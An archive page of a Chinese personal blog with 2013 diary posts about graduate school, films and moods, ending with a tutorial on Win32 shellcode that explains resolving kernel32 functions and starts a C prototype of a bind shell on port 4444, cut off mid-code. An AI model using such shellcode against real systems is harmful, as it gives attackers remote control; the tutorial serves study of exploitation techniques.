<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/9/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/09/30/" itemprop="url">
                  九月将尽
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-09-30T00:00:00+08:00" content="2013-09-30">
              2013-09-30
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/09/30/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/09/30//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="这是换spf13后的第一篇文章">这是换spf13后的第一篇文章</h2><p>果然英语写的东西说英语的人好用，像我这经常切换输入法的中文用户，没有依云的切换fcitx脚本，竟然各种按错。</p>
<p>几天前见bin哥的vim很漂亮，问了下是spf13这个vim发行版。于是给自己也换了，为了那个airline能像powerline一样漂亮可是忙了一个中午。</p>
<p>初步体验了下，速度还不错。偶尔有点卡，我想把依云的东西也加上，不然输入法切得太蛋疼了。</p>
<h2 id="过几天可能会碰到Python">过几天可能会碰到Python</h2><p>试试新环境怎么样，我一直觉得自己配置的东西是最好的，但现在实在懒得配置任何东西，spf13看着也很棒，所以，我的配置就见鬼了。</p>
<p>大体上spf13感觉相当好。过几天可能会用到python，看看这新环境真么样。</p>
<h2 id="项目慢慢有压力">项目慢慢有压力</h2><p>刚开始的话，大体上没太多事，至于今后怎么发展，PM都不怎么清楚。但时间表就在那里静静的放着，听师兄说，前端时间大多闲着，项目快结题了天天疯狂加班，这真囧。</p>
<p>项目算是商业机密，虽然就目前几个人的水平没啥好机密的，但肯定不适合像以前一样在博客里随便写了。</p>
<h2 id="写中文的话还是用vim不太合适">写中文的话还是用vim不太合适</h2><p>满篇的红色下划线。要么以后都用英文写算了。</p>
<h2 id="Hello_world">Hello world</h2><p>I’m tired and want to sleep.</p>
<blockquote>
<p>九月将尽</p>
<p>时光毫不留情地向前飞驰，车窗将街边的霓虹甩远，好似一个个光怪陆离的梦，一场接一场，绵延无尽头。</p>
<p>我的朋友啊，你真的醒了，还是沉睡在某个阴沉的雾霾天中，期待着万里晴空如洗，满城秋意盎然。悄悄的秋来了，悄悄地世界变了，一切似曾相识又形同路人。年年岁岁花相似，岁岁年年人不同。</p>
<p>站在学十顶楼阳台，望不清这城市。影影绰绰，似曾相识。万千感慨，不知何以开口。生亦由命，死亦由命。如电如露，浮游一瞬。</p>
<p>沉沉如梦，混混半生。我却不愿醒来，让我静静的睡个好觉。 </p>
</blockquote>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/09/15/" itemprop="url">
                  浪客剑心
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-09-15T00:00:00+08:00" content="2013-09-15">
              2013-09-15
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/09/15/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/09/15//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>把电影看完了，还真不错，画面和动感、音乐都大赞。</p>
<p>晚上又把ova 浪客剑心追忆篇看了遍，日系动漫真的做的厉害啊。画面大多都是静止的，但配上优秀得声优、优美得旋律、古典得画面，太合乎东方美学了。</p>
<p>算是追忆下明治维新得历史吧。</p>
<p>关于工作，我想吐槽下。。。又无力吐槽，祝愿所有人都一切顺利。</p>
<p>好水。。。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/09/13/" itemprop="url">
                  雨中帝都
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-09-13T00:00:00+08:00" content="2013-09-13">
              2013-09-13
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/09/13/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/09/13//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>屌丝就是屌丝,无法逃脱的命运.</p>
<p>其实我想说什么来着,帝都连着两天阴雨,天灰蒙蒙的,心里也阴沉沉的.十来天也在实验室混个面熟,然后就滚蛋去公司了,这么还真眷恋实验室.</p>
<p>天气依然中度或重度污染,但该活动还是会活动.</p>
<p>大概就这吧.在好多地方感觉大家还是很热情客气的,谢谢.</p>
<p>其实十一想回家看看,要不要花钱买票呢,回吧.</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/reviews/2013/09/09/" itemprop="url">
                  金色梦乡
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-09-09T00:00:00+08:00" content="2013-09-09">
              2013-09-09
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/reviews/" itemprop="url" rel="index">
                    <span itemprop="name">reviews</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/reviews/2013/09/09/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="reviews/2013/09/09//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="Golden_Slumber">Golden Slumber</h2><p>大概两年以前，非常痴迷推理小说，当时把阿加莎、宫部美雪、京极夏彦、东野圭吾等等的小说图书馆有的都翻了一遍，还有些同学有的也借来看。我还依稀记得图书馆3楼夕阳斜入时那份静谧与安宁，时间好像停滞一般。多希望那自由自在的日子能够永远。</p>
<p>大概那段时间，我听说有本小说叫作：金色梦乡。然而图书馆没有，朋友那里也没。我竟也没上网去买一本，甚至没有在网上找来看过。</p>
<p>让而这个书名却深深地烙印在心中，时不时就会想起。好像是一种用不能释怀的美好记忆。</p>
<p>我还记得两年前在网球场上等bing哥，阳光温暖和煦，似乎把整个世界都染成的金色我眯着眼凝视着安宁和煦的世界，不自觉就想起：金色梦乡。</p>
<p>是的，现在回头看真像一场温暖和煦的梦，好想时光倒流，回到从前。</p>
<h2 id="电影">电影</h2><p>昨天把电影看了，有着个人对抗国家的壮阔背景，却是如此一个温情默默的故事。</p>
<p>金色的梦乡是什么呢，青柳和朋友的记忆中，往日清闲自在的时光，永远也回不去的过去，无法磨灭的情谊。</p>
<h2 id="不自知">不自知</h2><blockquote>
<p>在幸福的漩涡中，不能自知。</p>
</blockquote>
<p>珍惜现在，现在就是金色的梦乡。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/09/06/" itemprop="url">
                  四叠半
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-09-06T00:00:00+08:00" content="2013-09-06">
              2013-09-06
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/09/06/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/09/06//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="人生是苦">人生是苦</h2><p>总之，先说说动画。风格很奇特的动画，音乐很赞，声优很赞，剪辑不错。</p>
<p>早上没去实验室也没上课，愣是把四叠半神话大系看完了。</p>
<p>努力追寻中便是人生的色彩和意义么？</p>
<p>真不该看这种动画，看完后丝毫高兴不起来，情绪一落千丈。</p>
<p>我在追寻什么呢？在生活的洪流裹挟下跌跌撞撞，摇摇摆摆。不知所以的到了今天这个地步。然后我想：</p>
<blockquote>
<p>真该死，时光若能倒流就好了，如果当初我做了那个选择而不是这个…..</p>
</blockquote>
<p>然而谁知道，也许都是性格悲剧下的命运。无论如何的挣扎骚动叛逆抗争，结局都是一样的吧，谁知道。</p>
<p>我不知道有何意义，快乐的日子总是倏忽即逝，难熬的岁月回头看时也恍然如梦，时光像匆匆穿过身体的风一样，来无影，去无踪，什么也没有留下。</p>
<p>过往种种，真像梦一样。</p>
<p>人生是苦，苦在无常。</p>
<h2 id="Recent_times">Recent times</h2><p>大概记下最近吧，希望没漏下什么，但也不可能什么都写下。</p>
<p>二十八号怀着依依不舍的心情从家乡漂到北京，混乱的情绪好像火车车窗外阴郁的天。我还记得毕业回家离开无锡的时候，火车上摄人心魄的美丽初阳，半天燃烧绚烂的云朵，绿色的原野与高远的天空。然而到北京什么都没有看到，什么看的心情也没有。</p>
<p>如果说毕业离校那天是失魂落魄的惋惜和怀念，到北京的路上只有无奈和麻木。</p>
<p>火车晚点两个小时，晃晃悠悠进了北京站，到处都是人，人如潮涌，匆匆忙忙，在人的海洋中随波逐流，不知所以地被推出地铁站。</p>
<p>谢谢mapleray，让我漂泊的前路没有这么孤单和沮丧，给晃荡的人一个前方的目标。还能够打起精神问到在哪里买票，排队买了票上车，一直站到BIT。</p>
<p>中午从BIT离开，一路步行到BUPT，就像梦一样。办理入宿又是好长的队，好在碰到一起面试的同学，可以打法下时间。</p>
<p>说来真幸福，分到一个很棒的宿舍。</p>
<p>晚上联系上Tom Sawyer学长，很恬不知耻地蹭了顿饭，又打发了半个晚上的无聊日子。</p>
<p>似乎闲着好几天，自己竟然跑去买了一整套被褥，一路从bupt南门拖到北门，竟然半个问下的人都没……不过这无所谓。</p>
<p>办了个手机卡，然而也没打几个电话，几天前才记住自己的电话</p>
<p>选助教莫名选了个助管，然后，让我等通知就没然后了</p>
<p>选课，基本随便选了。竟然在考研版看到lanphon会来问课表。当初是看着lanphon的TeX笔记入门的，真想见见lanphon。</p>
<p>大学同学出国，和寝室室友还有这位同学聚了一次，恍惚间似乎时光倒流，回到无锡。</p>
<p>联系上以为以前大学学院的学长，又恬不知耻地蹭了一顿饭，谢谢学长招待。不觉聊起JNU的种种。学长说一直想回去看看。</p>
<p>某天下午N老板跟我们讲讲大组的情况，然后让我们写张条子。这之后某天就被分组了，竟然是Tom Sawyer学长那里。学长很热心地指导下，于是又是一顿阴差阳错。</p>
<p>暂时在实验室没什么事，天天在实验室晃来晃去，实验室有酸奶，有水，我又没什么事，忽然觉得简直是天堂。没事去骚扰骚扰这个同学，打扰打扰那个学长，看看什么html的闲书，打打C语言的哈欠，一天一天就这么过去。</p>
<p>然而幸福的日子总归是短暂的。</p>
<p>人生是苦，苦在无常。</p>
<p>但愿我能鼓起勇气，大步流星的向前走。有这么些事，我没忘记，只是不敢。</p>
<h2 id="相对论">相对论</h2><p>今天同学聊着说，有心情时没时间，有时间时没心情。</p>
<p>真不明白，如果我想往哪个方向，往前走就是了，却贪念另一条路的风景不肯前行，却畏惧前方的险阻不敢踏步？</p>
<p>这真是永远的悲剧。</p>
<p>事情总是比我想像的好，多少来说我也是悲观的吧。不过我对自我的印象和评价也极度偏差，大概不愿意面对自己，谁知道。</p>
<p>我想我该勇敢点，就像不怕麻烦的人不会碰上麻烦，畏惧的人将总是受伤。昨天洗了个冷水澡，水温远比我想像的高很多很多。世事也许也是如此，远比我想像的温和简单。</p>
<p>我又不冷静了，其实是因为现在又一个人在寝室了。珍惜现有的人生吧，努力向前走吧。我想先一个人出去转转。</p>
<p>碎碎念完毕，果然现在冷静多了。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2013/08/31/so-boring/" itemprop="url">
                  So Boring
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-08-31T00:00:00+08:00" content="2013-08-31">
              2013-08-31
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2013/08/31/so-boring/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2013/08/31/so-boring/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>静等分组，一个人呆在宿舍上网。百无聊赖，上qq看看，上人人看看，又看看github，又瞄瞄邮箱。</p>
<p>下午想看看staged shellcode，毫无心情，hick.org没打开，最终什么都没看。估计今后这两年再也没有机会看这些东西了吧，再也没有自由自在折腾的机会了吧。也不想折腾了。</p>
<p>我想回头重新，看看、拥抱这个世界。</p>
<p>下午一个人麻木地在大街上穿行，转了一圈看看卡上为数不多的余额什么也没干又回宿舍了。</p>
<p>晚饭舍友们都各自有约，吃过晚饭一个人跑到师大图书馆旁边的一条长椅呆呆地坐着，思绪万千，又不知何物。</p>
<p>走在学校中人来人往，闲晃的学生，嬉闹的情侣，散步的老人，过来打球和锻炼的中青年人，如行尸走肉般闲逛的我。穿行在那里，是什么心情？</p>
<p>好像太多想抓住的溜走了，想珍惜的失去了，艳羡的遥不可及。</p>
<p>心如死灰，死灰也会复燃吧。也许是最后一篇文章了。</p>
<p>也许我该自信一些。出去跑步去。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2013/08/26/win32-shellcode/" itemprop="url">
                  Win32 shellcode 管窥
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-08-26T00:00:00+08:00" content="2013-08-26">
              2013-08-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2013/08/26/win32-shellcode/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/08/26/win32-shellcode/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h1 id="Win32_shellcode_管窥">Win32 shellcode 管窥</h1><p>本文讨论下win32 shellcode。</p>
<h2 id="什么是shellcode？">什么是shellcode？</h2><p>参见维基百科，想要翻译下结果一直没翻译。简单说下，就是一段测试漏洞的代码，可以控制计算机、干坏事等等等等。。。这段代码一般通过某种手段注入到有漏洞的程序内存空间中，运行并向攻击者提供一个控制台。</p>
<p>shellcode通常但也不总是为了获取一个shell，但获取一个shell是获取计算机控制权的一流方式。</p>
<h2 id="如何编写shellcode？">如何编写shellcode？</h2><p>在windows中，不要指望像linux下那样用系统调用直接和内核交互，因为windows的系统调用一直在变化，也没有好的文档。</p>
<p>windows下把一些函数放到了dll链接库中，当程序运行时，这些dll库被载入到当前程序的内存空间中。调用这些函数只要知道这些函数的地址就行了。可是，每一个windows版本甚至一个补丁都会让这些地址变化。</p>
<p>但kernel32一定会被加载到内存空间中去，kernel32.dll的地址在一个叫作PEB的块中却比较固定，于是人们就搜索PEB来找到kernel32.dll的地址。</p>
<p>找到kernel32的地址之后，可以通过输出表(Export Table)搜索和解析之中所有的函数地址。尽管有些dll并不像kernel32一定会加载到程序内存空间中，却可以解析kernel32中的LoadLibraryA来载入它们，然后通过同样的解析函数方法来解析这些dll中的函数地址。</p>
<p>由于shellcode的独特性，我们用汇编会获取更好的控制。但首先我会先用C语言来原型，搞清楚这些程序都干了什么。</p>
<h3 id="工具">工具</h3><p>我用了以下一些工具：</p>
<ul>
<li>wine lcc ： C编译器</li>
<li>wine immunity debugger： 调试器</li>
<li>shell ：工作环境和测试脚本</li>
<li>nasm ：汇编器</li>
<li>python： 我用来写一些小工具来比如帮助获取倒过来(因为x86中字节序的问题)函数哈希。</li>
</ul>
<p>当然还有写od一类的unix小工具，一个正常的linux发行版都会有这些东西的。</p>
<h3 id="工作流">工作流</h3><ol>
<li>找到kernel32的地址</li>
<li>解析出想要调用函数的地址</li>
<li>在堆上构建参数和调用函数</li>
</ol>
<p>虽然原理很简单，但是有些小细节：</p>
<ol>
<li>尽量模块化重复代码即使用函数。函数尽量没有副作用，就是说尽量别把寄存器搞得乱七八糟。</li>
<li>尽量向前跳而不是向后跳，这是为了什么来着，对了为了减少shellcode中的NULL。你可以先不考虑这个问题，这比较复杂，这需要熟悉哪些等效的机器码没有bad characters。</li>
<li>记住jmp不能跳太远，也许你需要一些中转点。</li>
<li>你可以把要用到的常量或者参数直接放到shellcode中某处，或者就地在栈上构建，只要你方便索引就行。这主要看需求，比如你想集成的metasploit中，就最好把想更改的东西放到固定位置。</li>
</ol>
<h2 id="示例">示例</h2><p>Talk is cheap, show you the code… C代码是我自己写的，shellcode不一定是我自己写的。但即使是我自己写的也要仰仗于nologin上那篇著名的win32shellcode论文和projectshellcode上的示例。推荐有兴趣的人看看。</p>
<h3 id="示例1：端口绑定shellcode">示例1：端口绑定shellcode</h3><p>绑定一个端口并提供远程控制台。绑定到本机4444</p>
<p>C原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * =====================================================================================</span><br><span class="line"> *</span><br><span class="line"> *       Filename:  port_bind.c</span><br><span class="line"> *</span><br><span class="line"> *    Description:  port_bind in windows</span><br><span class="line"> *</span><br><span class="line"> *        Version:  1.0</span><br><span class="line"> *        Created:  08/18/2013 05:01:19 PM</span><br><span class="line"> *       Revision:  none</span><br><span class="line"> *       Compiler:  lcc</span><br><span class="line"> *</span><br><span class="line"> *         Author:  reverland, </span><br><span class="line"> *   Organization:  </span><br><span class="line"> *</span><br><span class="line"> * =====================================================================================</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  WORD wVersionRequested;</span><br><span class="line">  <span class="keyword">struct</span> sockaddr_in host;</span><br><span class="line">  <span class="keyword">struct</span> sockaddr* addr;</span><br><span class="line">  SOCKET MySock, NSock;</span><br><span class="line">  wVersionRequested = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">int</span> nret;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FreeConsole</span></span><br><span class="line">  FreeConsole();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of WSADATA is %d\n"</span>, <span class="keyword">sizeof</span>(wsaData));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size of wVersionRequested is %d\n"</span>, <span class="keyword">sizeof</span>(wVersionRequested));</span><br><span class="line">  <span class="comment">// WSAStartup</span></span><br><span class="line">  <span class="keyword">if</span> (WSAStartup(wVersionRequested, &amp;wsaData) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ws2 outof date!\n"</span>);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// WSASocket</span></span><br><span class="line">  MySock = WSASocket(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  host.sin_family = AF_INET;</span><br><span class="line">  host.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">  host.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line"></span><br><span class="line">  <span 